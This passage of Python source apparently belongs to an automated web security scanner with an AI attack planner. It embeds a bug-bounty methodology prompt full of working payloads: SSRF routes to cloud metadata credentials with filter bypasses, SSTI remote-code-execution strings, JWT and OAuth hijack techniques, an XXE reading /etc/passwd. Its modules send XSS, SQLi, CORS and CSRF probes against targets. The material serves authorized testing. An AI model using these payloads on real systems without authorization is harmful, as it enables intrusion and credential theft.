                    debug.append(f"Login SUCCESS — token in JSON key '{key}'")
                    return {"Authorization": f"Bearer {data[key]}", "__login_debug__": debug}
        except Exception:
            pass

        # Success signal 3: redirected away from login page (no cookies, but session in server)
        if (post_final_url.rstrip("/") != login_url.rstrip("/")
                and post_final_url.rstrip("/") != actual_login_url.rstrip("/")):
            debug.append(f"Redirected to {post_final_url} — server may use server-side session "
                         f"but sent no Set-Cookie. Cookie jar may already be populated by httpx.")
            # One more attempt: try reading cookies now (some servers set them on redirect)
            all_cookies = dict(client.cookies)
            if all_cookies:
                debug.append(f"Cookies now present: {list(all_cookies.keys())}")
                return {
                    "__cookies__": all_cookies,
                    "__cookie_header__": _cookies_to_header(all_cookies),
                    "__login_debug__": debug,
                }

        debug.append("Login FAILED — no session cookies, no token, still on login page")
        return {"__login_debug__": debug}

    return {}


def _cookies_to_header(cookies: dict[str, str]) -> str:
    """Convert cookie dict to Cookie header string."""
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


# ── AI Strategy Planner ───────────────────────────────────────────────────────

# Hunt Harness methodology used as Claude context — condensed from the operator's
# Hunt Harness multi-agent engine (hunt-recon-mapper, hunt-access-control,
# hunt-ssrf, hunt-injection, hunt-auth-session, hunt-client-side, hunt-business-logic,
# hunt-infra-supply hunters + hunt-triage-verifier false-positive gate).
_HUNT_SKILL_CONTEXT = """
HUNT HARNESS METHODOLOGY (bug-bounty tradecraft, weighted by what actually gets paid 2022-2025):

PRIORITY ORDER (hunt these first — highest yield):
RCE/cmdi > SSRF-to-cloud-metadata-creds > auth bypass / any-account takeover >
mass/bulk PII (often auto-Critical, easier than RCE) > CSRF-on-ATO, write/delete IDOR,
stored-XSS-to-admin, SQLi extraction, JWT/OAuth ATO > read-IDOR, reflected-XSS-with-reach,
open-redirect+OAuth, race conditions, CORS+ACAC chains.
Rising & paid: authorization bugs (IDOR/BOLA/BFLA), ATO chains, SSRF-to-cloud,
business-logic races, request smuggling, AI/LLM prompt-injection (+540% reports).
Falling reward but still P1: commodity reflected XSS, classic SQLi.

HIGHEST-YIELD, CHEAPEST TESTS (run these against every target):
1. IDOR method-swap: re-test every "protected" GET as PUT/DELETE/PATCH/POST — write-method
   BOLA is ~46% of confirmed cases.
2. ID wrapping/encoding bypass: {"id":[123]}, {"id":{"id":123}}, HPP id=yours&id=victim.
   GraphQL global IDs: base64-decode -> increment -> re-encode (Base64("User:1337")).
3. Tenant fuzz: inject/alter org_id/team_id/account_id/workspace in body & headers.
4. Mass assignment: add role=admin, isAdmin=true, is_staff=true, plan=enterprise,
   verified=true, owner/user_id/from to write requests; diff GET response fields vs
   what PUT/POST accepts.
5. Single-packet race: for redeem/withdraw/vote/coupon/invite flows, fire 20-30 requests
   in one burst (last-byte-sync) — turned limit-overruns into six-figure findings.

SSRF -> CLOUD METADATA (exact targets):
- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>;
  /latest/user-data. IMDSv2 needs PUT /latest/api/token (X-aws-ec2-metadata-token-ttl-seconds)
  then GET with X-aws-ec2-metadata-token — a GET-only SSRF cannot complete IMDSv2, so
  webhook/smuggling primitives are the top-value chains. ECS/EKS: 169.254.170.2/v2/credentials.
- GCP: metadata.google.internal/computeMetadata/v1/... (Metadata-Flavor: Google).
  Azure: 169.254.169.254/metadata/identity/oauth2/token (Metadata: true).
- Bypasses: decimal 2852039166, hex 0xA9FEA9FE, [::ffff:169.254.169.254], nip.io,
  127.1/0/0177.0.0.1; DNS rebinding (the primary 2024-25 allowlist bypass);
  redirect-based (allowed host 302 -> metadata); gopher:// for blind Redis/SMTP pivots.

SSTI (fingerprint -> RCE):
{{7*7}} -> 49; {{7*'7'}} -> 7777777 = Jinja2, -> 49 = Twig; ${{7*7}} Freemarker/Spring-EL;
#{{7*7}} Thymeleaf; <%= 7*7 %> ERB; @(7*7) Razor. RCE: Jinja2
{{cycler.__init__.__globals__.os.popen('id').read()}}; Twig {{['id']|filter('system')}};
Thymeleaf ${{T(java.lang.Runtime).getRuntime().exec('id')}}.

HTTP REQUEST SMUGGLING (2025 frontier):
CL.TE / TE.CL / TE.TE classics, plus CL.0 and 0.CL (need an early-response gadget —
static file, IIS reserved names /con /nul), double-desync (0.CL->CL.0), Expect-based
desync (Expect: 100-continue, obfuscated "Expect: y 100-continue" bypasses filters).
HTTP/2 downgrade: H2.CL (false content-length), H2.TE (ALB-accepted transfer-encoding),
CRLF in h2 header values. Prove with a poisoned response to a canary request, never
real users. High-value targets: load balancers, reverse proxies, CDN edges, API gateways.

XSS — MODERN BYPASS CHAINS:
Mutation XSS/DOMPurify: namespace-confusion payloads survive sanitize-then-reserialize
(CVE-2024-45801 chains prototype pollution of the depth-counter -> sanitizer bypass).
CSP bypass: whitelisted-host JSONP (&jsonp=alert(1)//), AngularJS orderBy sandbox escape,
DOM clobbering under strict-dynamic, <base href> hijack when base-uri is unset, nonce reuse.
postMessage: loose *.domain.com origin regex + reflected sink + no-CSP static asset +
DOM-clobbering gadget = XSS on the real origin.

OAUTH / JWT / ATO PRIMITIVES:
- redirect_uri: path-traversal .../callback/../attacker, victim.com@attacker.com,
  victim.com.attacker.com, attacker.com#@victim.com, param pollution
  redirect_uri=legit&redirect_uri=attacker.
- Missing "state" -> forced account-linking CSRF. Leak code/token via Referer from the
  callback page. Pre-ATO: register victim email before IdP use; RP not checking
  email_verified/aud.
- JWT: alg:none (strip signature), RS256->HS256 confusion (HMAC-sign with the public
  key), jku/jwks injection, kid path-traversal/SQLi, weak secret brute-force.
- Password reset: host-header poisoning (Host/X-Forwarded-Host/dup Host -> attacker
  link), token in body/Referer, email param injection email=victim&email=attacker,
  response manipulation (403->200), predictable/non-invalidated tokens.
  2FA bypass: response replay, missing OTP rate-limit, race, backup-code IDOR, CSRF on
  disable-2FA.

CRLF INJECTION / HTTP PARAMETER POLLUTION:
- CRLF: inject %0d%0a in redirect/url/next/return params to split the HTTP response;
  log poisoning via User-Agent/X-Forwarded-For.
- HPP: duplicate params (id=legitimate&id=victim) — backend may use last, WAF checks
  first; PHP uses last value, Node/Express arrays, ASP.NET first value.

SAML ATTACKS:
Signature wrapping (move SignedInfo to a different subtree), XXE in SAMLResponse
(<!ENTITY xxe SYSTEM "file:///etc/passwd">), unsigned-assertion acceptance, attribute
pollution after the signed block.

WEBSOCKET / CSWSH:
Cross-Site WebSocket Hijacking — connect from an attacker origin; if the handshake
succeeds without a CSRF token, it's vulnerable. Common endpoints: /socket.io/, /ws,
/cable, /hub, /signalr.

CHAIN PATTERN (low + low = critical — always look for the second link):
A self-only/attacker-only primitive (self-XSS, header reflection, open redirect, CRLF,
internal SSRF) + a delivery/scope amplifier (CSRF, CDN caching, OAuth redirect,
wildcard cookie scope, over-permissioned cloud identity) removes the self-only
constraint. Real chains: self-XSS+login-CSRF->ATO; open-redirect+OAuth->ATO;
reset-token-Referer-leak->ATO; IDOR-edit-email+reset->ATO; SSRF+GCP-metadata+kubelet->
cluster RCE.

FALSE-POSITIVE GATE (do not call it confirmed unless it clears this):
XSS = payload actually executes (not reflected-but-encoded, not self-XSS with no
delivery). SQLi = 2+ techniques agree, or one extracted value, or timing repeated x3
vs baseline. SSRF = Collaborator DNS+HTTP hit from the target's IP, or metadata body
returned (not client-side fetch). IDOR/BOLA = cross-account read/write of another
user's data proven with two independent sessions. CORS = ACAO reflects attacker origin
AND ACAC:true AND sensitive data AND SameSite=None. Open redirect = final Location is
an attacker-controlled external host. SSTI = arithmetic actually evaluates. cmdi/RCE =
benign command output or OOB DNS with a unique token. Race/business-logic = the
limit-violating end state is reached with before/after proof. Timing-only oracles are
the #1 false positive — never trust a single spike, and downgrade any signal against a
CDN-fronted host.

SAFETY (hard stops — read-confirm, never execute destructively):
Only authorized targets. Never delete/corrupt data. Never modify data without an
immediate revert. Never exfiltrate PII at scale (2-3 masked samples prove a bulk-PII
bug). Never complete a real purchase/transfer/message as a real user. RCE proof is one
benign command (id/whoami) — no persistence, no lateral movement. Write/delete IDOR is
reported as "impact assessed, not executed" with the exact request, not by actually
performing the destructive action.
"""


async def _ai_plan_attack(target: str, tech_stack: list[str],
                          endpoints: list[str], modules: list[str],
                          ai_config: dict | None = None) -> str:
    """Use Claude to generate a prioritised attack strategy using Hunt Harness context.

    Raises RuntimeError if API key is not configured.
    Raises any Anthropic API exception so the caller can emit a proper SSE error event.
    """
    cfg = ai_config or {}
    if cfg.get("provider", "anthropic") != "qwen" and not (cfg.get("api_key") or settings.ANTHROPIC_API_KEY):
        raise RuntimeError("ANTHROPIC_API_KEY is not configured")

    system_prompt = (
        "You are an expert penetration tester and bug bounty hunter operating the Hunt "
        "Harness methodology. You have deep knowledge of advanced web security techniques "
        "from real bug bounty reports, weighted by what actually gets paid. "
        "Be concise, specific, and actionable. Focus only on high-impact, exploitable findings. "
        "Reference the Hunt Harness methodology below when relevant.\n\n"
        + _HUNT_SKILL_CONTEXT
    )

    user_prompt = f"""Analyse this target and produce a prioritised attack strategy.

TARGET: {target}
TECH STACK: {', '.join(tech_stack) if tech_stack else 'unknown'}
DISCOVERED ENDPOINTS: {json.dumps(endpoints[:30])}
MODULES RUNNING: {', '.join(modules)}

Provide:
1. Top 3 most likely high-impact vulnerabilities for this specific tech stack (with reasoning)
2. Which endpoints to prioritise and why (reference actual endpoints above)
3. Specific Hunt Harness techniques most applicable to this target
4. Any unusual attack angles given the tech stack (e.g., framework-specific quirks)

Max 250 words. Be specific — reference actual endpoints and tech detected above."""

    from app.services import llm_client
    return await llm_client.complete(cfg, system_prompt, [{"role": "user", "content": user_prompt}], 500, label="attack_suite_planner")


async def _ai_analyze_finding(finding: dict, target: str, ai_config: dict | None = None) -> str:
    """Use Claude to deeply analyze a specific finding and suggest exploitation steps."""
    cfg = ai_config or {}
    if cfg.get("provider", "anthropic") != "qwen" and not (cfg.get("api_key") or settings.ANTHROPIC_API_KEY):
        return ""

    from app.services import llm_client
    try:
        return await llm_client.complete(cfg, None, [{"role": "user", "content": (
            f"Security finding on {target}:\n"
            f"Title: {finding.get('title')}\n"
            f"Severity: {finding.get('severity')}\n"
            f"Evidence: {str(finding.get('evidence', ''))[:300]}\n\n"
            "In 2-3 sentences: what is the real-world impact and what is the fastest "
            "exploitation path? Reference any relevant Hunt Harness technique."
        )}], 200, label="attack_suite_finding_analysis")
    except llm_client.LLMConfigError:
        return ""


# ── Module: Security Headers ──────────────────────────────────────────────────

async def _module_headers(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    yield _probe("headers", "GET", target, note="fetching security headers")
    try:
        r = await client.get(target, timeout=10)
        yield _probe("headers", "GET", target, status=r.status_code, size=len(r.content),
                     note=f"headers present: {', '.join(k for k in r.headers if k.lower() in ['strict-transport-security','content-security-policy','x-frame-options','x-content-type-options','permissions-policy'])}")
        h = {k.lower(): v for k, v in r.headers.items()}

        checks = [
            ("strict-transport-security" not in h, "hsts_missing", "medium",
             "Missing HSTS Header",
             "No Strict-Transport-Security header. Enables protocol downgrade attacks.",
             "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
            ("content-security-policy" not in h, "csp_missing", "medium",
             "Missing Content-Security-Policy",
             "No CSP header. XSS attacks can execute arbitrary scripts without restriction.",
             "Implement a restrictive Content-Security-Policy with default-src 'self'"),
            (not h.get("x-frame-options") and "frame-ancestors" not in h.get("content-security-policy", ""),
             "clickjacking", "medium",
             "Clickjacking Risk (No X-Frame-Options / frame-ancestors)",
             "Page can be embedded in attacker-controlled iframes for clickjacking attacks.",
             "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'"),
            (h.get("x-content-type-options", "").lower() != "nosniff",
             "xcto_missing", "low",
             "Missing X-Content-Type-Options: nosniff",
             "Browser MIME-sniffing can cause content-type confusion attacks.",
             "Add: X-Content-Type-Options: nosniff"),
            ("referrer-policy" not in h, "referrer_policy", "low",
             "Missing Referrer-Policy",
             "URL parameters may leak to third parties via Referer header.",
             "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            ("permissions-policy" not in h and "feature-policy" not in h,
             "permissions_policy", "info",
             "Missing Permissions-Policy",
             "No restrictions on browser features (camera, microphone, geolocation).",
             "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
        ]

        for condition, test_name, severity, title, desc, rem in checks:
            if condition:
                yield _finding("headers", test_name, severity, title, desc,
                               f"Response headers: {dict(list(h.items())[:10])}", target, True, rem)

        server = h.get("server", "")
        if server and any(c.isdigit() for c in server):
            yield _finding("headers", "server_version", "low",
                "Server Version Disclosure",
                f"Server header reveals software version, aiding fingerprinting.",
                f"Server: {server}", target, True,
                "Configure server to suppress version in the Server header.")

        if "x-powered-by" in h:
            yield _finding("headers", "x_powered_by", "low",
                "X-Powered-By Technology Disclosure",
                f"Reveals backend technology: {h['x-powered-by']}",
                f"X-Powered-By: {h['x-powered-by']}", target, True,
                "Remove X-Powered-By header from all responses.")

        acao = h.get("access-control-allow-origin", "")
        if acao == "*" and h.get("access-control-allow-credentials", "").lower() == "true":
            yield _finding("headers", "cors_wildcard_creds", "high",
                "CORS Wildcard with Credentials",
                "ACAO: * combined with Allow-Credentials: true allows cross-origin credential theft.",
                f"ACAO: {acao}", target, True, "Specify explicit trusted origins.")

    except httpx.HTTPError as e:
        pass


# ── Module: CORS Misconfiguration ─────────────────────────────────────────────

async def _module_cors(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    CORS detection with exploitability validation:
    - Wildcard ACAO: only reported when endpoint returns real user data (JSON, >200 bytes)
    - Reflected origin: only CRITICAL when BOTH ACAO reflects AND ACAC=true (real credential theft)
    - Reflected origin without credentials: HIGH severity (data readable, not cookie theft)
    - Correctly skips the impossible ACAO:* + credentials combo (browser rejects it)
    """
    parsed = urlparse(target)

    # ── Test 1: Wildcard ACAO on data-returning API endpoints ────────────────
    for path in CORS_WILDCARD_API_PATHS[:8]:
        url = target + path
        yield _probe("cors", "GET", url, note="checking CORS wildcard on API endpoint")
        try:
            r = await client.get(url, timeout=8)
            acao = r.headers.get("access-control-allow-origin", "")
            yield _probe("cors", "GET", url, status=r.status_code, size=len(r.content),
                         note=f"ACAO: {acao or '(not set)'}, CT: {r.headers.get('content-type','')[:40]}")
            ct = r.headers.get("content-type", "")
            if (acao == "*" and r.status_code == 200
                    and "application/json" in ct and len(r.content) > 200):
                # Parse to check it actually has user/data fields (not just {})
                try:
                    data = r.json()
                    # Must have meaningful keys — empty dict/list doesn't count
                    has_real_data = (
                        (isinstance(data, dict) and len(data) > 1) or
                        (isinstance(data, list) and len(data) > 0)
                    )
                except Exception:
                    has_real_data = True  # Can't parse, be conservative

                if has_real_data:
                    yield _finding("cors", "cors_wildcard_data_api", "high",
                        f"CORS Wildcard on Data API Endpoint: {path}",
                        f"Endpoint `{path}` returns {len(r.content)} bytes of JSON data "
                        f"with `Access-Control-Allow-Origin: *`. Any website can read this "
                        f"response cross-origin via fetch(). Sensitive data exposed if "
                        f"authenticated users call this endpoint.",
                        f"URL: {url}\nACAO: *\nResponse size: {len(r.content)}b\n"
                        f"Sample keys: {list(data.keys())[:5] if isinstance(data, dict) else 'array'}",
                        url, True,
                        "Replace ACAO: * with an explicit origin allowlist. "
                        "Never use wildcard CORS on data-returning API endpoints.",
                        confidence="high")
                    break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: Reflected origin — requires ACAO echo + real response data ────
    test_origins = [
        ("https://evil.example.com", "arbitrary origin"),
        ("null", "null origin (sandboxed iframe)"),
        (f"https://{parsed.netloc}.evil.com", "suffix bypass"),
        (f"https://evil.{parsed.netloc}", "prefix bypass"),
    ]
    test_paths = CORS_SENSITIVE_PATHS + ["/api/me", "/api/user", "/api/profile", "/graphql"]

    for path in test_paths[:6]:
        url = target + path
        for origin, technique in test_origins:
            try:
                # Test preflight
                yield _probe("cors", "OPTIONS", url, payload=f"Origin: {origin}", note=f"preflight — {technique}")
                pre_r = await client.options(url, headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization",
                }, timeout=8)
                acao = pre_r.headers.get("access-control-allow-origin", "")
                acac = pre_r.headers.get("access-control-allow-credentials", "false").lower()
                yield _probe("cors", "OPTIONS", url, status=pre_r.status_code,
                             note=f"ACAO: {acao or '(none)'}, ACAC: {acac}")
                origin_reflected = (acao == origin or
                                    (origin != "null" and len(origin) > 5 and origin in acao))

                # Also test simple GET with Origin header
                yield _probe("cors", "GET", url, payload=f"Origin: {origin}", note=f"simple request — {technique}")
                get_r = await client.get(url, headers={"Origin": origin}, timeout=8)
                yield _probe("cors", "GET", url, status=get_r.status_code, size=len(get_r.content),
                             note=f"ACAO: {get_r.headers.get('access-control-allow-origin','(none)')}")
                acao2 = get_r.headers.get("access-control-allow-origin", "")
                acac2 = get_r.headers.get("access-control-allow-credentials", "false").lower()
                get_reflected = (acao2 == origin or
                                 (origin != "null" and len(origin) > 5 and origin in acao2))

                if origin_reflected or get_reflected:
                    _acao_used = acao if origin_reflected else acao2
                    _acac_used = acac if origin_reflected else acac2
                    _has_credentials = _acac_used == "true"

                    # Verify the endpoint actually returns meaningful data
                    # (not just a 200 empty response or error page)
                    response_has_data = (get_r.status_code == 200
                                         and len(get_r.content) > 100)

                    if not response_has_data:
                        continue  # Origin reflected but endpoint returns nothing — low risk

                    if _has_credentials:
                        yield _finding("cors", f"cors_reflected_credentials_{technique[:15]}", "critical",
                            f"CORS Misconfiguration — Reflected Origin + Credentials: {technique}",
                            f"Server reflects `{origin}` in ACAO **AND** sets "
                            f"`Access-Control-Allow-Credentials: true`. An attacker's site "
                            f"can make authenticated cross-origin requests and read the "
                            f"victim's cookies/tokens from the response.",
                            f"Endpoint: {url}\nOrigin sent: {origin}\nACAO: {_acao_used}\n"
                            f"ACAC: {_acac_used}\nResponse size: {len(get_r.content)}b",
                            url, True,
                            "Validate Origin against an explicit allowlist. Never dynamically "
                            "reflect the Origin header. Never combine wildcard with credentials.",
                            confidence="high")
                    else:
                        yield _finding("cors", f"cors_reflected_{technique[:15]}", "high",
                            f"CORS Reflected Origin Bypass — {technique}",
                            f"Server reflects `{origin}` in ACAO. Without Allow-Credentials, "
                            f"cookies won't be sent, but any public data at this endpoint can be "
                            f"read cross-origin by an attacker-controlled website.",
                            f"Endpoint: {url}\nOrigin sent: {origin}\nACAO: {_acao_used}",
                            url, True,
                            "Validate Origin against an explicit allowlist. "
                            "Never dynamically reflect the request Origin.",
                            confidence="medium")
                    return

            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: CSRF ──────────────────────────────────────────────────────────────

async def _module_csrf(target: str, client: httpx.AsyncClient,
                       forms: list[dict]) -> AsyncGenerator[dict, None]:
    # ── Test 0: SameSite=None cookie detection ────────────────────────────────
    # SameSite=None means cookies are sent on cross-site requests — CSRF is
    # possible if there are no other mitigations (token, origin check).
    try:
        r = await client.get(target, timeout=8)
        for cookie_header in r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") else [r.headers.get("set-cookie", "")]:
            if cookie_header and "samesite=none" in cookie_header.lower():
                cookie_name = cookie_header.split("=")[0].strip()
                yield _finding("csrf", "samesite_none", "medium",
                    f"Session Cookie '{cookie_name}' Uses SameSite=None",
                    f"Cookie is sent on all cross-site requests, enabling CSRF attacks. "
                    f"Without a CSRF token or Origin validation, any site can trigger "
                    f"authenticated actions on behalf of the victim.",
                    f"Set-Cookie: {cookie_header[:200]}",
                    target, True,
                    "Change SameSite to 'Lax' or 'Strict'. Add a CSRF token to all "
                    "state-changing requests.",
                    confidence="medium")
                break
    except httpx.HTTPError:
        pass

    # ── Test 1: Missing CSRF token in forms ───────────────────────────────────
    for form in forms[:10]:
        action = form.get("action", "")
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        if method != "POST":
            continue

        csrf_inputs = [i for i in inputs if "csrf" in i.lower() or "token" in i.lower()
                       or "nonce" in i.lower()]
        if not csrf_inputs:
            yield _finding("csrf", "missing_csrf_token", "medium",
                f"No CSRF Token in POST Form",
                f"Form at {action} uses POST without a CSRF token field. "
                f"Inputs found: {inputs}",
                f"Form action: {action}\nMethod: POST\nInputs: {inputs}",
                action, True,
                "Add a CSRF token to all state-changing forms. Validate server-side.",
                confidence="medium")

    # Test sensitive endpoints for CSRF via content-type bypass
    parsed = urlparse(target)
    for path in CSRF_SENSITIVE_ACTIONS:
        url = target + path
        try:
            # Send JSON body as text/plain — SameSite bypass technique
            r = await client.post(url,
                content='{"email":"attacker@evil.com"}',
                headers={"Content-Type": "text/plain", "Origin": "https://evil.example.com"},
                timeout=8)
            # A correct 401/403 rejection must not count as a "potential bypass" —
            # only (404, 405, 501) were excluded before, so a properly-auth-gated
            # endpoint still fired this finding. Found via a 2026-09-15 audit.
            if r.status_code not in (401, 403, 404, 405, 501):
                yield _finding("csrf", "csrf_content_type_bypass", "medium",
                    f"Potential CSRF via Content-Type Bypass on {path}",
                    f"Endpoint {path} returned {r.status_code} with text/plain content-type. "
                    f"May bypass CSRF protection relying on content-type validation.",
                    f"Status: {r.status_code}, Content-Type: text/plain bypass",
                    url, True,
                    "Validate CSRF tokens regardless of Content-Type. "
                    "Use SameSite=Strict cookies for session management.",
                    confidence="low", oracle="bare-signal")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: XSS ───────────────────────────────────────────────────────────────

async def _module_xss(target: str, client: httpx.AsyncClient,
                      forms: list[dict],
                      waf_bypass_payloads: list[str] | None = None,
                      js_tainted_params: list[str] | None = None) -> AsyncGenerator[dict, None]:
    """
    XSS detection with proof-of-concept validation:
    - Uses unique canary tokens to correlate injections
    - Encoding-aware: only reports if payload appears UNESCAPED in response
    - DOM XSS: only flags when sink + source co-exist in the same <script> block
    - Stored XSS: verifies canary on a subsequent GET to the same URL
    """
    # Build param list — JS-informed tainted params go first (higher priority)
    priority_params = list(js_tainted_params or []) + [
        p for p in XSS_TEST_PARAMS if p not in (js_tainted_params or [])
    ]
    params_to_test = priority_params[:10]

    # Build payload list — WAF bypass payloads first
    base_payloads = XSS_PAYLOADS[:6]
    if waf_bypass_payloads:
        base_payloads = list(waf_bypass_payloads[:4]) + base_payloads

    hit_params: set[str] = set()

    # ── Phase 1: Reflected XSS with unique canary ────────────────────────────
    for param in params_to_test:
        if param in hit_params:
            continue
        canary = _unique_canary()
        # Use canary embedded in payload so we can correlate the exact injection
        probe_payload = f'<script>/*{canary}*/</script>'
        test_url = f"{target}?{param}={probe_payload}"
        yield _probe("xss", "GET", test_url, payload=probe_payload, note=f"param={param}, canary={canary}")
        try:
            r = await client.get(test_url, timeout=8)
            yield _probe("xss", "GET", test_url, status=r.status_code, size=len(r.content),
                         note=f"canary in body: {'YES — checking escape' if canary in r.text else 'no'}")
            ct = r.headers.get("content-type", "")
            if "text/html" in ct and canary in r.text:
                # Canary present — now check if it's UNESCAPED (i.e., executable)
                if _is_unescaped_in_html(probe_payload, r.text):
                    hit_params.add(param)
                    yield _finding("xss", "reflected_xss", "high",
                        f"Reflected XSS via '{param}' parameter",
                        f"Unique canary `{canary}` reflected UNESCAPED in HTML response. "
                        f"The `<script>` tag is not HTML-entity-encoded — directly exploitable.",
                        f"URL: {test_url}\nCanary: {canary}\n"
                        f"Context snippet: {r.text[max(0,r.text.find(canary)-50):r.text.find(canary)+80]}",
                        test_url, True,
                        "HTML-encode all user-supplied input before reflection. "
                        "Implement a strict Content-Security-Policy.",
                        confidence="high")
                    continue

        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # If canary injection didn't confirm, try event-handler payload with encoding check
        if param not in hit_params:
            for payload in base_payloads[:3]:
                test_url2 = f"{target}?{param}={payload}"
                try:
                    r2 = await client.get(test_url2, timeout=8)
                    ct2 = r2.headers.get("content-type", "")
                    if "text/html" in ct2:
                        # Must appear unescaped AND contain a dangerous char sequence
                        for sig in ["<script", "onerror=", "onload=", "onfocus=", "javascript:"]:
                            if sig in payload and _is_unescaped_in_html(payload, r2.text):
                                hit_params.add(param)
                                yield _finding("xss", "reflected_xss", "high",
                                    f"Reflected XSS via '{param}' parameter",
                                    f"Payload `{payload[:60]}` reflected unescaped in HTML response.",
                                    f"URL: {test_url2}\nUnescaped reflection confirmed.",
                                    test_url2, True,
                                    "HTML-encode all user-supplied input before reflection.",
                                    confidence="high")
                                break
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)
                if param in hit_params:
                    break

    # ── Phase 2: Stored XSS via forms — canary + GET verification ────────────
    for form in forms[:5]:
        method = form.get("method", "GET")
        action = form.get("action", target)
        inputs = form.get("inputs", [])
        if method.upper() != "POST" or not inputs:
            continue

        canary = _unique_canary()
        # Embed canary in a recognisable but safe-looking payload
        payload = f'<img src=x id="atxss_{canary}" onerror=console.log(1)>'
        form_data: dict = {}
        for inp in inputs:
            if any(kw in inp.lower() for kw in ["password", "token", "csrf", "_token", "hidden"]):
                form_data[inp] = "testpassword123"
            else:
                form_data[inp] = payload

        try:
            yield _probe("xss", "POST", action, payload=payload[:80], note="stored XSS form probe")
            post_r = await client.post(action, data=form_data, timeout=10)
            yield _probe("xss", "POST", action, status=post_r.status_code, size=len(post_r.content),
                         note=f"canary in body: {'YES' if canary in post_r.text else 'no'}")
            # Check immediate response (reflected after POST)
            if canary in post_r.text and _is_unescaped_in_html(f'id="atxss_{canary}"', post_r.text):
                yield _finding("xss", "stored_xss", "critical",
                    f"Stored/Reflected XSS via Form at {action}",
                    f"Canary `{canary}` survived POST unescaped in response. "
                    f"Server is rendering raw HTML from form input.",
                    f"Form: {action}\nPayload: {payload[:80]}\nCanary: {canary}",
                    action, True,
                    "HTML-encode all output from user-supplied data. "
                    "Validate and sanitise all form inputs server-side.",
                    confidence="high")
            else:
                # Try fetching the action URL again (stored XSS shows on read)
                get_r = await client.get(action, timeout=8)
                if canary in get_r.text and _is_unescaped_in_html(f'atxss_{canary}', get_r.text):
                    yield _finding("xss", "stored_xss", "critical",
                        f"Stored XSS Confirmed at {action}",
                        f"Canary `{canary}` persisted and appeared unescaped on subsequent GET — "
                        f"stored XSS confirmed.",
                        f"Form: {action}\nPayload: {payload[:80]}\nCanary confirmed on GET: yes",
                        action, True,
                        "HTML-encode all output. Sanitise before storing in database.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Phase 3: DOM XSS — source+sink co-location in <script> blocks only ──
    try:
        r = await client.get(target, timeout=8)
        confirmed_sinks = _extract_js_sinks_from_body(r.text)
        if confirmed_sinks:
            yield _finding("xss", "dom_xss_source_sink", "medium",
                f"DOM XSS: Dangerous Sink + User-Controlled Source in Same Script Block",
                f"Found sink(s) `{', '.join(confirmed_sinks[:3])}` co-located with user-controlled "
                f"DOM sources (location.search, location.hash, etc.) in an inline <script> block. "
                f"User input may flow directly into an executable sink without sanitisation.",
                f"Sinks found: {confirmed_sinks}\nURL: {target}",
                target, True,
                "Avoid dangerous DOM sinks. Use DOMPurify before innerHTML assignments. "
                "Use textContent instead of innerHTML for plain-text data.",
                confidence="medium")
    except httpx.HTTPError:
        pass


# ── Module: SQLi ──────────────────────────────────────────────────────────────

async def _module_sqli(target: str, client: httpx.AsyncClient,
                       forms: list[dict],
                       waf_bypass_payloads: list[str] | None = None) -> AsyncGenerator[dict, None]:
    """
    SQL injection detection with false-positive elimination:
    - Error-based: verifies DB error patterns are NOT in baseline response
    - Time-based: 3-sample statistical analysis (mean + 2σ threshold)
    - Error patterns are DB-vendor-specific (no generic "error" strings)
    """
    # DB-vendor-specific error patterns only (no generic "syntax error" which catches JS errors)
    _SQLI_CONFIRMED_PATTERNS = [
        "you have an error in your sql syntax",   # MySQL
        "warning: mysql_",                         # PHP MySQL
        "unclosed quotation mark after the character string",  # MSSQL
        "quoted string not properly terminated",   # Oracle
        "pg_query(): query failed",                # PostgreSQL
        "sqlite3.operationalerror",                # SQLite
        "odbc sql server driver",                  # ODBC MSSQL
        "ora-00933",                               # Oracle
        "sqlstate[",                               # PDO generic
        "near \"'\"",                              # SQLite syntax near quote
    ]

    # Establish baseline for the page WITHOUT injection (to filter pre-existing errors)
    baseline_body = ""
    try:
        yield _probe("sqli", "GET", target, note="baseline request (no payload)")
        baseline_r = await client.get(target, timeout=8)
        yield _probe("sqli", "GET", target, status=baseline_r.status_code, size=len(baseline_r.content),
                     note="baseline established")
        baseline_body = baseline_r.text.lower()
    except Exception:
        pass

    # Statistical baseline timing (3 samples)
    yield _probe("sqli", "GET", target, note="timing baseline — 3 samples to measure normal response time")
    baseline_mean, baseline_stdev = await _timing_samples(client, target, n=3)
    yield _probe("sqli", "GET", target, note=f"timing baseline: mean={baseline_mean:.2f}s stdev={baseline_stdev:.2f}s")

    # Augment error payloads with WAF-specific bypass payloads
    error_payloads = list(SQLI_ERROR_PAYLOADS)
    if waf_bypass_payloads:
        error_payloads = list(waf_bypass_payloads) + error_payloads

    hit_params: set[str] = set()

    # Test URL parameters
    for param in SQLI_TEST_PARAMS[:5]:
        if param in hit_params:
            continue

        # ── Error-based: inject quote, look for NEW DB errors ───────────────
        for quote in ["'", '"']:
            try:
                test_url = f"{target}?{param}={quote}"
                yield _probe("sqli", "GET", test_url, payload=quote, note=f"error-based probe, param={param}")
                r = await client.get(test_url, timeout=8)
                yield _probe("sqli", "GET", test_url, status=r.status_code, size=len(r.content))
                bl = r.text.lower()
                for pat in _SQLI_CONFIRMED_PATTERNS:
                    if pat in bl and pat not in baseline_body:
                        hit_params.add(param)
                        # Extract the error snippet for evidence
                        idx = bl.find(pat)
                        snippet = r.text[max(0, idx - 20):idx + 200]
                        yield _finding("sqli", "error_sqli_url", "high",
                            f"SQL Error Disclosure via '{param}' URL parameter",
                            f"Injecting `{quote}` into `{param}` triggered a DB error not "
